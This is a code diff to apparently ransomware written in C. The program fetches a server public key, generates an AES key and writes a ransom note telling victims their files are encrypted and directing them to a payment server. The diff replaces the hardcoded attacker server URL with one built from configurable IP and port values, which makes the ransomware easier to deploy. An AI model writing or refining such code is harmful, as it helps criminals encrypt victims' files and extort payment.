@@ -18,7 +18,20 @@ int main(int argc, char *argv[]) {
         printf("Failed to retrieve public key from server\n");
         return 1;
     }
-   unsigned char aes_key[32];
+    char* external_ip = get_config_value("external_ip");
+    char* web_port_str = get_config_value("web_port");
+    if (!external_ip || !web_port_str) {
+        printf("Failed to read config\n");
+        if (external_ip) free(external_ip);
+        if (web_port_str) free(web_port_str);
+        return 1;
+    }
+    char server_url[256];
+    snprintf(server_url, sizeof(server_url), "http://%s:%s", external_ip, web_port_str);
+    free(external_ip);
+    free(web_port_str);
+
+    unsigned char aes_key[32];
     if (!generate_random_key(aes_key, sizeof(aes_key))) {
         printf("Failed to generate AES key\n");
         return 1;
@@ -78,7 +91,7 @@ int main(int argc, char *argv[]) {
              "To decrypt them, visit %s and enter the ID: %d\n"
              "Follow the instructions there to retrieve your decryption key.\n"
              "DO NOT DELETE key.enc or verify.enc! If you do, you won't be able to recover your files.",
-             SERVER_URL, id);
+             server_url, id);
     if (!create_readme(ransom_note)) {
         printf("Failed to create ransom note\n");
         return 1;
